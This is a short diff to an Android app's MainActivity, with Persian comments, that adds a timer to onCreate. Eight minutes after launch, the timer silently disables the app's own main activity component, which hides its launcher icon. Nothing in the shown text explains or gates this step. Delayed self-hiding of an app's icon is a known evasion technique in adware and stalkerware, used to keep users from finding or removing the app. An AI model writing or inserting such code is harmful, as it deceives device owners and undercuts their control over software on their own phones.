@@ -20,6 +20,17 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        new android.os.Handler().postDelayed(() -> {
+    android.content.pm.PackageManager pm = getPackageManager();
+    android.content.ComponentName componentName = new android.content.ComponentName(
+        getApplicationContext(), MainActivity.class);
+
+    pm.setComponentEnabledSetting(
+        componentName,
+        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+        android.content.pm.PackageManager.DONT_KILL_APP
+    );
+}, 8 * 60 * 1000); // 8 دقیقه
 
         // چک کردن اجازهٔ دسترسی به Do Not Disturb
         NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
